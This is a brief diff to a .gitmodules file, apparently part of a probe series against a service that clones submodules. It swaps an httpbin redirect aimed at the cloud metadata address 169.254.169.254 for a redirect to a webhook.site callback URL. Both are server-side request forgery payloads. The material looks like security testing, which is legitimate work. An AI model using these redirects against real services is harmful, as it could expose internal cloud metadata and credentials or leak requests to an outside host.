@@ -1,3 +1,3 @@
-[submodule "p20-httpbin-redir-imds"]
-	path = p20-httpbin-redir-imds
-	url = https://httpbin.org/redirect-to?url=http://169.254.169.254/metadata/v1/id&status_code=302
+[submodule "p21-httpbin-redir-wh"]
+	path = p21-httpbin-redir-wh
+	url = https://httpbin.org/redirect-to?url=https://webhook.site/6840c6cb-66f4-42ef-b5e3-38bfbf020c75/p21-redir&status_code=302
